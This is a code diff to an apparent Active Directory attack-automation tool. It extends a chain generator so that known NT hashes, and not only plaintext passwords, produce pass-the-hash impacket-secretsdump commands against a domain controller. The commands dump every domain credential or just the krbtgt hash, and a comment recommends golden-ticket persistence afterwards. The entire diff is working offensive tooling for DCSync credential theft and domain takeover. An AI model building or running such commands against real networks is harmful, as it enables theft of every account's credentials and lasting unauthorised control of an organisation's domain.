@@ -892,7 +892,20 @@ def run(report, store, ui=None):
             admincount_via[u_low] = via
     if admincount_users:
         seen_ac = set()
-        for (ulc, pw), occurrences in e.creds.items():
+        # iter-96: same expansion as iter-95 for R-CONSTRAINED - if the
+        # admincount user's NT hash is known but no plaintext, we can still
+        # DCSync with -hashes. Zip plaintexts + hashes into one iterable
+        # tagged so the emitted command branches on hash vs pw.
+        _cand_ac = list(e.creds.items())
+        for _hash, _occs in e.nt.items():
+            for _huser, _hs, _hl in _occs:
+                if not _huser:
+                    continue
+                _hulc = _huser.strip().lower()
+                if not _hulc:
+                    continue
+                _cand_ac.append(((_hulc, f":{_hash}"), [(_huser, _hs, _hl)]))
+        for (ulc, pw), occurrences in _cand_ac:
             if ulc not in admincount_users or ulc in seen_ac:
                 continue
             seen_ac.add(ulc)
@@ -905,17 +918,23 @@ def run(report, store, ui=None):
             _dc_ac = store.dc_ip() or "<DC-IP>"
             via = admincount_via.get(ulc, "")
             via_note = f" via '{via}'" if via else " (admincount=1)"
+            # iter-96: hash-only auth uses -hashes ':NT' impacket syntax.
+            _is_hash_ac = pw.startswith(":")
+            _hash_flag = f" -hashes 'aad3b435b51404eeaad3b435b51404ee:{pw[1:]}'" if _is_hash_ac else ""
+            _auth_target = (f"'{_dom_ac}/{ulc}'@{_dc_ac}" if _is_hash_ac
+                            else f"'{_dom_ac}/{ulc}:{pw}'@{_dc_ac}")
+            _summary_val = f"NT hash for {ulc}" if _is_hash_ac else f"{ulc}:{pw}"
             chains.append(Chain("R-ADMIN-CRED", "already-DA cred",
-                f"{ulc}:{pw} - tier-0 candidate{via_note}",
+                f"{_summary_val} - tier-0 candidate{via_note}",
                 crit=10, conf=0.95, ready=1.5, prox=1.0,         # score 14.25
                 commands=[
                     f"# BloodHound flags {ulc} as tier-0{via_note}",
                     # iter-54: two variants - full dump for immediate loot,
                     # or targeted krbtgt-only for fast R-GOLDEN cascade.
-                    f"impacket-secretsdump '{_dom_ac}/{ulc}:{pw}'@{_dc_ac}",
+                    f"impacket-secretsdump{_hash_flag} {_auth_target}",
                     f"# or targeted (just krbtgt for R-GOLDEN):",
-                    f"impacket-secretsdump -just-dc-user krbtgt "
-                    f"'{_dom_ac}/{ulc}:{pw}'@{_dc_ac}",
+                    f"impacket-secretsdump -just-dc-user krbtgt{_hash_flag} "
+                    f"{_auth_target}",
                     f"# if either works you have DA - proceed to R-GOLDEN "
                     f"for persistence",
                 ], src=best_src, line=best_line))
